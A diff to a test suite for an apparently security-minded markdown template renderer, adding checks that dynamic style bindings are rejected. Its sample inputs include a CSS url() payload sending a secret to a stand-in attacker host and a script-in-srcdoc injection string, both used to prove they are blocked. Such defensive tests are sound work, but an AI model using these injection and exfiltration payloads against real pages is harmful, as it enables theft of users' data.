@@ -428,6 +428,11 @@ Unavailable
     await expect(renderMarkdownTemplate('<iframe :srcdoc="data.payload"></iframe>', {
       data: { payload: "<script>globalThis.compromised = true</script>" },
     })).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0030" })
+    await expect(renderMarkdownTemplate('<div :style="data.css">Content</div>', {
+      data: { css: "background:url(https://attacker.test/collect?secret=1)" },
+    })).rejects.toThrow("cannot target a style attribute")
+    await expect(renderMarkdownTemplate('<div style="color: red">Content</div>')).resolves.toContain('style="color: red"')
+  })
   })
 
   it("preserves URL-like attributes on custom tags", async () => {
